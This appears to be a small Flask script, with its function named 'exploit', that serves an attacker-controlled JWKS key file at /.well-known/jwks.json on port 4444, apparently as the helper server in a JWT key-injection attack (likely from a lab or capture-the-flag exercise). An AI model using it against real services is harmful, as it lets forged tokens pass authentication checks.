from flask import Flask

app = Flask(__name__)

@app.route('/.well-known/jwks.json')
def exploit():
    with open('jwks.json', 'r') as f:
        jwks = f.read()
    return jwks, 200, {'Content-Type': 'application/json'}

app.run(port=4444)